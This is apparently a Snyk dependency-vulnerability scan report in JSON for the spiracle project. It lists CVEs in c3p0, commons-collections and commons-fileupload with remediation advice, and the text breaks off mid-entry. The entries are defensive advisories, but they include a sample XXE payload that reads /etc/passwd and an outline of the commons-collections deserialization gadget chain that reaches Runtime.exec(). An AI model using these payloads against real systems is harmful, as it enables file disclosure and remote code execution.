{
  "vulnerabilities": [
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O",
      "alternativeIds": [],
      "creationTime": "2019-04-23T13:03:26.998435Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 5.9,
      "description": "## Overview\n[com.mchange:c3p0](https://mvnrepository.com/artifact/com.mchange/c3p0) is a mature, highly concurrent JDBC Connection pooling library, with support for caching and reuse of PreparedStatements.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to missing protections against recursive entity expansion when loading XML configurations.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.mchange:c3p0` to version 0.9.5.4 or higher.\n## References\n- [POC: Hackerone Report](https://hackerone.com/reports/509315)\n",
      "disclosureTime": "2019-04-22T22:18:26Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.9.5.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "C3P0ConfigXmlUtils",
            "filePath": "com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java",
            "functionName": "extractXmlConfigFromInputStream"
          },
          "version": [
            "[,0.9.5.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils",
            "functionName": "extractXmlConfigFromInputStream"
          },
          "version": [
            "[,0.9.5.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMMCHANGE-174481",
      "identifiers": {
        "CVE": [
          "CVE-2019-5427"
        ],
        "CWE": [
          "CWE-776"
        ],
        "GHSA": [
          "GHSA-84p2-vf58-xhxv"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "c3p0",
        "groupId": "com.mchange"
      },
      "modificationTime": "2020-06-12T14:37:01.471265Z",
      "moduleName": "com.mchange:c3p0",
      "packageManager": "maven",
      "packageName": "com.mchange:c3p0",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-04-22T22:18:26Z",
      "references": [
        {
          "title": "POC: Hackerone Report",
          "url": "https://hackerone.com/reports/509315"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,0.9.5.4)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "com.mchange:c3p0@0.9.2.1"
      ],
      "upgradePath": [
        false,
        "com.mchange:c3p0@0.9.5.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.mchange:c3p0",
      "version": "0.9.2.1"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-07-21T14:11:12.037284Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n\n[com.mchange:c3p0](https://mvnrepository.com/artifact/com.mchange/c3p0) is a mature, highly concurrent JDBC Connection pooling library, with support for caching and reuse of PreparedStatements.\n\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection\nvia the `extractXmlConfigFromInputStream` in `com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java` during initialization.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\r\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\r\n\r\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\r\n\r\nFor example, below is a sample XML document, containing an XML element- username.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n   <username>John</username>\r\n</xml>\r\n```\r\n\r\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<!DOCTYPE foo [\r\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\r\n   <username>&xxe;</username>\r\n</xml>\r\n```\r\n\r\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\n\nUpgrade `com.mchange:c3p0` to version 0.9.5.3 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/swaldman/c3p0/commit/7dfdda63f42759a5ec9b63d725b7412f74adb3e1)\n",
      "disclosureTime": "2018-12-24T13:29:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "0.9.5.3"
      ],
      "functions": [
        {
          "functionId": {
            "className": "C3P0ConfigXmlUtils",
            "filePath": "com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java",
            "functionName": "extractXmlConfigFromInputStream"
          },
          "version": [
            "[,0.9.5.3)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils",
            "functionName": "extractXmlConfigFromInputStream"
          },
          "version": [
            "[,0.9.5.3)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMMCHANGE-451675",
      "identifiers": {
        "CVE": [
          "CVE-2018-20433"
        ],
        "CWE": [
          "CWE-611"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "c3p0",
        "groupId": "com.mchange"
      },
      "modificationTime": "2021-01-26T07:34:24.330125Z",
      "moduleName": "com.mchange:c3p0",
      "packageManager": "maven",
      "packageName": "com.mchange:c3p0",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-07-21T14:22:18Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/swaldman/c3p0/commit/7dfdda63f42759a5ec9b63d725b7412f74adb3e1"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,0.9.5.3)"
        ]
      },
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "XML External Entity (XXE) Injection",
      "severityWithCritical": "critical",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "com.mchange:c3p0@0.9.2.1"
      ],
      "upgradePath": [
        false,
        "com.mchange:c3p0@0.9.5.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.mchange:c3p0",
      "version": "0.9.2.1"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O",
      "alternativeIds": [],
      "creationTime": "2016-12-25T16:51:56Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n\n[commons-collections:commons-collections](https://mvnrepository.com/artifact/commons-collections/commons-collections) is a library which contains types that extend and augment the Java Collections Framework.\n\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data.\nIt is possible to execute arbitrary Java code with the `InvokerTransformer` serializable collections . The `sun.reflect.annotation.AnnotationInvocationHandler#readObject` method invokes `#entrySet` and `#get` on a deserialized collection. If an attacker has to ability to send serialized data (JMX, RMI, EJB) to an application using the `common-collections` library, it is possible to combine the aforementioned methods to execute arbitrary code on the application.\n\n## Details\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\r\n\r\n  \r\n\r\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\r\n\r\n  \r\n\r\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\r\n\r\n  \r\n\r\nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\r\n\r\n  \r\n\r\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\r\n\r\n- Apache Blog\r\n\r\n  \r\n\r\nThe vulnerability, also know as _Mad Gadget_\r\n\r\n> Mad Gadget is one of the most pernicious vulnerabilities we’ve seen. By merely existing on the Java classpath, seven “gadget” classes in Apache Commons Collections (versions 3.0, 3.1, 3.2, 3.2.1, and 4.0) make object deserialization for the entire JVM process Turing complete with an exec function. Since many business applications use object deserialization to send messages across the network, it would be like hiring a bank teller who was trained to hand over all the money in the vault if asked to do so politely, and then entrusting that teller with the key. The only thing that would keep a bank safe in such a circumstance is that most people wouldn’t consider asking such a question.\r\n\r\n- Google\n\n## Remediation\n\nUpgrade `commons-collections:commons-collections` to version 3.2.2 or higher.\n\n\n## References\n\n- [FoxGloveSecurity Blog](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)\n\n- [GitHub Commit](https://github.com/apache/commons-collections/commit/e585cd0433ae4cfbc56e58572b9869bd0c86b611)\n\n- [Jira Issue](https://issues.apache.org/jira/browse/COLLECTIONS-580)\n\n- [PoC](https://github.com/ianxtianxt/CVE-2015-7501)\n",
      "disclosureTime": "2015-11-06T16:51:56Z",
      "exploit": "Functional",
      "fixedIn": [
        "3.2.2"
      ],
      "functions": [
        {
          "functionId": {
            "className": "InvokerTransformer",
            "filePath": "org/apache/commons/collections/functors/InvokerTransformer.java",
            "functionName": "transform"
          },
          "version": [
            "[3,3.2.2)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.apache.commons.collections.functors.InvokerTransformer",
            "functionName": "transform"
          },
          "version": [
            "[3,3.2.2)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMMONSCOLLECTIONS-30078",
      "identifiers": {
        "CVE": [
          "CVE-2015-4852",
          "CVE-2015-7501"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "commons-collections",
        "groupId": "commons-collections"
      },
      "modificationTime": "2019-09-06T13:34:59.829115Z",
      "moduleName": "commons-collections:commons-collections",
      "packageManager": "maven",
      "packageName": "commons-collections:commons-collections",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2015-11-06T16:51:56Z",
      "references": [
        {
          "title": "FoxGloveSecurity Blog",
          "url": "http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/commons-collections/commit/e585cd0433ae4cfbc56e58572b9869bd0c86b611"
        },
        {
          "title": "Jira Issue",
          "url": "https://issues.apache.org/jira/browse/COLLECTIONS-580"
        },
        {
          "title": "PoC",
          "url": "https://github.com/ianxtianxt/CVE-2015-7501"
        }
      ],
      "semver": {
        "vulnerable": [
          "[3.0,3.2.2)"
        ]
      },
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "critical",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "commons-collections:commons-collections@3.2"
      ],
      "upgradePath": [
        false,
        "commons-collections:commons-collections@3.2.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-collections:commons-collections",
      "version": "3.2"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:R",
      "alternativeIds": [],
      "creationTime": "2019-10-10T18:31:03.943542Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 5.6,
      "description": "## Overview\n\n[commons-collections:commons-collections](https://mvnrepository.com/artifact/commons-collections/commons-collections) is a library which contains types that extend and augment the Java Collections Framework.\n\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data.\nVersions of commons-collections prior to `3.2.2` do not prevent deserialization of the class `org.apache.commons.collections.functors.InvokerTransformer`. This could be leveraged by an attacker as a gadget within a vulnerable application which deserializes user input to execute arbitrary code. \r\n\r\nVersions of commons-collections from 3.2.2 onwards will  throw an `UnsupportedOperationException` error when attempts are made to deserialize InvokerTransformer instances to prevent potential remote code execution exploits.\r\n\r\n## PoC \r\n\r\n```\r\n/*\r\n\tGadget chain:\r\n\t\tObjectInputStream.readObject()\r\n\t\t\tAnnotationInvocationHandler.readObject()\r\n\t\t\t\tMap(Proxy).entrySet()\r\n\t\t\t\t\tAnnotationInvocationHandler.invoke()\r\n\t\t\t\t\t\tLazyMap.get()\r\n\t\t\t\t\t\t\tChainedTransformer.transform()\r\n\t\t\t\t\t\t\t\tConstantTransformer.transform()\r\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\r\n\t\t\t\t\t\t\t\t\tMethod.invoke()\r\n\t\t\t\t\t\t\t\t\t\tClass.getMethod()\r\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\r\n\t\t\t\t\t\t\t\t\tMethod.invoke()\r\n\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()\r\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\r\n\t\t\t\t\t\t\t\t\tMethod.invoke()\r\n\t\t\t\t\t\t\t\t\t\tRuntime.exec()\r\n\tRequires:\r\n\t\tcommons-collections\r\n */\r\n```\n\n## Details\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\r\n\r\n  \r\n\r\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\r\n\r\n  \r\n\r\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\r\n\r\n  \r\n\r\nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\r\n\r\n  \r\n\r\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\r\n\r\n- Apache Blog\r\n\r\n  \r\n\r\nThe vulnerability, also know as _Mad Gadget_\r\n\r\n> Mad Gadget is one of the most pernicious vulnerabilities we’ve seen. By merely existing on the Java classpath, seven “gadget” classes in Apache Commons Collections (versions 3.0, 3.1, 3.2, 3.2.1, and 4.0) make object deserialization for the entire JVM process Turing complete with an exec function. Since many business applications use object deserialization to send messages across the network, it would be like hiring a bank teller who was trained to hand over all the money in the vault if asked to do so politely, and then entrusting that teller with the key. The only thing that would keep a bank safe in such a circumstance is that most people wouldn’t consider asking such a question.\r\n\r\n- Google\n\n\n## Remediation\n\nUpgrade `commons-collections:commons-collections` to version 3.2.2 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/apache/commons-collections/commit/5ec476b0b756852db865b2e442180f091f8209ee)\n\n- [GitHub PR](https://github.com/apache/commons-collections/pull/18)\n\n- [Jira Ticket](https://issues.apache.org/jira/browse/COLLECTIONS-580)\n",
      "disclosureTime": "2019-10-10T00:00:00Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "3.2.2"
      ],
      "functions": [
        {
          "functionId": {
            "className": "InvokerTransformer",
            "filePath": "org/apache/commons/collections/functors/InvokerTransformer.java",
            "functionName": "<init>"
          },
          "version": [
            "[3.1, 3.22)",
            "[,3.0-dev2)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.apache.commons.collections.functors.InvokerTransformer",
            "functionName": "<init>"
          },
          "version": [
            "[3.1, 3.22)",
            "[,3.0-dev2)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMMONSCOLLECTIONS-472711",
      "identifiers": {
        "CVE": [
          "CVE-2015-6420"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-6hgm-866r-3cjv"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "commons-collections",
        "groupId": "commons-collections"
      },
      "modificationTime": "2021-01-25T09:48:49.627257Z",
      "moduleName": "commons-collections:commons-collections",
      "packageManager": "maven",
      "packageName": "commons-collections:commons-collections",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-02-24T00:00:00Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/commons-collections/commit/5ec476b0b756852db865b2e442180f091f8209ee"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/apache/commons-collections/pull/18"
        },
        {
          "title": "Jira Ticket",
          "url": "https://issues.apache.org/jira/browse/COLLECTIONS-580"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,3.2.2)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "commons-collections:commons-collections@3.2"
      ],
      "upgradePath": [
        false,
        "commons-collections:commons-collections@3.2.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-collections:commons-collections",
      "version": "3.2"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
      "alternativeIds": [],
      "creationTime": "2016-12-25T16:51:48Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 7.3,
      "description": "## Overview\n[`commons-fileupload:commons-fileupload`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22commons-fileupload%22)\nAffected versions of this package are vulnerable to Arbitrary File Write.\n\n## Details\nThe DiskFileItem class in Apache Commons FileUpload, as used in Red Hat JBoss BRMS 5.3.1; JBoss Portal 4.3 CP07, 5.2.2, and 6.0.0; and Red Hat JBoss Web Server 1.0.2 allows remote attackers to write to arbitrary files via a NULL byte in a file name in a serialized instance.\n\n## References\n- [Redhat Security Advisory](https://access.redhat.com/security/cve/CVE-2013-2186)\n- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2013-2186)\n",
      "disclosureTime": "2013-06-16T16:51:48Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "1.3.1"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-30080",
      "identifiers": {
        "CVE": [
          "CVE-2013-2186"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "commons-fileupload",
        "groupId": "commons-fileupload"
      },
      "modificationTime": "2019-06-02T07:36:40.934521Z",
      "moduleName": "commons-fileupload:commons-fileupload",
      "packageManager": "maven",
      "packageName": "commons-fileupload:commons-fileupload",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2013-06-16T16:51:48Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/commons-fileupload/commit/163a6061fbc077d4b6e4787d26857c2baba495d1"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2013-2186"
        },
        {
          "title": "RedHat CVE Database",
          "url": "https://access.redhat.com/security/cve/CVE-2013-2186"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.3.1)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary File Write",
      "severityWithCritical": "high",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "commons-fileupload:commons-fileupload@1.3"
      ],
      "upgradePath": [
        false,
        "commons-fileupload:commons-fileupload@1.3.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
      "alternativeIds": [],
      "creationTime": "2016-12-25T16:51:51Z",
      "credit": [
        "Mark Thomas"
      ],
      "cvssScore": 7.3,
      "description": "## Overview\n[`commons-fileupload:commons-fileupload`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22commons-fileupload%22)\nAffected versions of this package are vulnerable to Denial of Service (DoS) attacks. An attacker may send a specially crafted `Content-Type` header that bypasses a loop's intended exit conditions, causing an infinite loop and high CPU consumption.\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\r\n\r\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\r\n\r\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\r\n\r\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\r\n\r\nTwo common types of DoS vulnerabilities:\r\n\r\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\r\n\r\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)\n\n## References\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0050)\n- [Github ChangeLog](https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml#L90)\n- [Oren Hafif Blog](http://blog.spiderlabs.com/2014/02/cve-2014-0050-exploit-with-boundaries-loops-without-boundaries.html)\n- [Apache-SVN](http://svn.apache.org/viewvc?view=revision&revision=1565143)\n- [Apache Mailing list archives](http://mail-archives.apache.org/mod_mbox/www-announce/201402.mbox/%3C52F373FC.9030907@apache.org%3E)\n- [Issue documentation](http://struts.apache.org/docs/s2-020.html)\n",
      "disclosureTime": "2014-02-11T16:51:51Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "1.3.1"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-30081",
      "identifiers": {
        "CVE": [
          "CVE-2014-0050"
        ],
        "CWE": [
          "CWE-264"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "commons-fileupload",
        "groupId": "commons-fileupload"
      },
      "modificationTime": "2019-06-02T07:36:41.637272Z",
      "moduleName": "commons-fileupload:commons-fileupload",
      "packageManager": "maven",
      "packageName": "commons-fileupload:commons-fileupload",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2014-02-11T16:51:51Z",
      "references": [
        {
          "title": "Apache Mailing list archives",
          "url": "http://mail-archives.apache.org/mod_mbox/www-announce/201402.mbox/%3C52F373FC.9030907@apache.org%3E"
        },
        {
          "title": "Apache-SVN",
          "url": "http://svn.apache.org/viewvc?view=revision&revision=1565143"
        },
        {
          "title": "Exploit DB",
          "url": "https://www.exploit-db.com/exploits/31615"
        },
        {
          "title": "Github ChangeLog",
          "url": "https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml%23L90"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/commons-fileupload/commit/c61ff05b3241cb14d989b67209e57aa71540417a"
        },
        {
          "title": "Issue documentation",
          "url": "http://struts.apache.org/docs/s2-020.html"
        },
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0050"
        },
        {
          "title": "Oren Hafif Blog",
          "url": "http://blog.spiderlabs.com/2014/02/cve-2014-0050-exploit-with-boundaries-loops-without-boundaries.html"
        },
        {
          "title": "POC: Potential Exploit",
          "url": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2014-0050-exploit-with-boundaries-loops-without-boundaries/"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.3.1)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "high",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "commons-fileupload:commons-fileupload@1.3"
      ],
      "upgradePath": [
        false,
        "commons-fileupload:commons-fileupload@1.3.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2016-12-25T16:51:56Z",
      "credit": [
        "TERASOLUNA Framework Development Team"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[commons-fileupload:commons-fileupload](https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload) is a component that provides a simple yet flexible means of adding support for multipart file upload functionality to servlets and web applications.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). It allows remote attackers to cause a denial of service (CPU consumption) via a long boundary string.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `commons-fileupload:commons-fileupload` to version 1.3.2 or higher.\n## References\n- [Apache Mail Archive](http://mail-archives.us.apache.org/mod_mbox/www-announce/201606.mbox/%3C6223ece6-2b41-ef4f-22f9-d3481e492832@apache.org%3E)\n- [Apache-SVN](http://svn.apache.org/viewvc/commons/proper/fileupload/trunk/RELEASE-NOTES.txt?r1=1745717&r2=1749637&diff_format=h)\n- [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3092)\n- [Github ChangeLog](https://github.com/apache/commons-fileupload/blob/b1498c9877d751f8bc4635a6f252ebdfcba28518/src/changes/changes.xml#L84)\n- [GitHub Commit](https://github.com/apache/tomcat80/commit/d752a415a875e888d8c8d0988dfbde95c2c6fb1d)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/2c3553f3681baf775c50bb0b49ea61cb44ea914f)\n- [GitHub Commit](https://github.com/apache/tomcat/commit/8999f8243197a5f8297d0cb1a0d86ed175678a77)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1349475)\n",
      "disclosureTime": "2016-06-22T16:51:56Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "1.3.2"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-30082",
      "identifiers": {
        "CVE": [
          "CVE-2016-3092"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "commons-fileupload",
        "groupId": "commons-fileupload"
      },
      "modificationTime": "2019-06-02T07:36:42.354413Z",
